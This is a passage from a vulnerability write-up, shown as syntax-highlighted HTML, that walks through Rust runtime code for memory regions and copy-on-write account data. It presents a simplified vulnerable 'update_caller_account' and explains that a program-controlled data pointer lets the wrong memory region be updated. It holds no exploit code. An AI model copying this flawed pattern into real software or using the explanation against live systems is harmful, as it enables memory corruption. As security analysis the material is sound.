</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span><span>            index </span><span class="token token" style="color:#67cdcc">&gt;&gt;=</span><span> index</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">trailing_zeros</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span><span>            </span><span class="token token" style="color:#cc99cd">if</span><span> index </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">20</span><span>                </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f8c555">None</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">21</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">22</span><span>            </span><span class="token token" style="color:#999">// Safety:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">23</span><span>            </span><span class="token token" style="color:#999">// we check for index==0 above, and by construction if we get here index</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">24</span><span>            </span><span class="token token" style="color:#999">// must be contained in region</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">25</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> region </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>regions</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_unchecked</span><span class="token token" style="color:#ccc">(</span><span>index </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">26</span><span>            </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">27</span><span>            </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">28</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">29</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">30</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">31</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<h2 class="text-4xl py-4 border-b border-white/10">The Vulnerability</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">So how are <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion.host_addr</code> updates implemented? The <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">update_caller_account()</code> function needs to detect when account data has been relocated due to CoW operations and update the corresponding memory regions.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">impl</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#f8c555">UnalignedMemoryMapping</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">region</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>        </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>        access_type</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">AccessType</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>        vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryRegion</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Box</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">dyn</span><span> </span><span class="token token" style="color:#e2777a">std</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#e2777a">error</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>        </span><span class="token token" style="color:#999">// Safety:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>        </span><span class="token token" style="color:#999">// &amp;mut references to the mapping cache are only created internally from methods that do not</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>        </span><span class="token token" style="color:#999">// invoke each other. UnalignedMemoryMapping is !Sync, so the cache reference below is</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>        </span><span class="token token" style="color:#999">// guaranteed to be unique.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> cache </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>cache</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span>        </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">find_region</span><span class="token token" style="color:#ccc">(</span><span>cache</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span>            </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">.</span><span>vm_addr</span><span class="token token" style="color:#ccc">..</span><span>region</span><span class="token token" style="color:#ccc">.</span><span>vm_addr_end</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">contains</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>vm_addr</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>                </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span> </span><span class="token token" style="color:#ccc">(</span><span>access_type </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f8c555">AccessType</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Load</span><span> </span><span class="token token" style="color:#67cdcc">||</span><span> </span><span class="token token" style="color:#f08d49">ensure_writable_region</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>cow_cb</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span><span>            </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span>                </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">20</span><span>        </span><span class="token token" style="color:#f8c555">Err</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">generate_access_violation</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>config</span><span class="token token" style="color:#ccc">,</span><span> access_type</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">unwrap_err</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">21</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">22</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">23</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">24</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">25</span><span></span><span class="token token" style="color:#999">// Vulnerable implementation (simplified)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">26</span><span></span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">update_caller_account</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">27</span><span>    invoke_context</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">InvokeContext</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">28</span><span>    memory_mapping</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">MemoryMapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">29</span><span>    is_loader_deprecated</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">30</span><span>    caller_account</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">CallerAccount</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">31</span><span>    callee_account</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">BorrowedAccount</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;_</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">32</span><span>    direct_mapping</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">33</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">34</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">35</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">36</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> direct_mapping </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span> caller_account</span><span class="token token" style="color:#ccc">.</span><span>original_data_len </span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#f08d49">0</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">37</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">38</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> region </span><span class="token token" style="color:#67cdcc">=</span><span> memory_mapping</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">region</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">AccessType</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Load</span><span class="token token" style="color:#ccc">,</span><span> caller_account</span><span class="token token" style="color:#ccc">.</span><span>vm_data_addr</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">39</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> callee_ptr </span><span class="token token" style="color:#67cdcc">=</span><span> callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_data</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">40</span><span>        </span><span class="token token" style="color:#cc99cd">if</span><span> region</span><span class="token token" style="color:#ccc">.</span><span>host_addr</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">!=</span><span> callee_ptr </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">41</span><span>            region</span><span class="token token" style="color:#ccc">.</span><span>host_addr</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span>callee_ptr</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">42</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">43</span><span>    </span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">The immediate question is, does the invariant of correct identification of <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> hold?</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The answer is no. Recall <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">CallerAccount.vm_data_addr</code> comes directly from <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo.data.as_ptr()</code> in the VM&#x27;s heap memory - memory that programs have complete control over.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">from_account_info</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    invoke_context</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">InvokeContext</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    memory_mapping</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryMapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    is_loader_deprecated</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    _vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    account_info</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    original_data_len</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">usize</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">CallerAccount</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#ccc">(</span><span>serialized_data</span><span class="token token" style="color:#ccc">,</span><span> vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span> ref_to_len_in_vm</span><span class="token token" style="color:#ccc">,</span><span> serialized_len_ptr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span><span>        </span><span class="token token" style="color:#999">// Double translate data out of RefCell</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> data </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#f08d49">translate_type</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span>
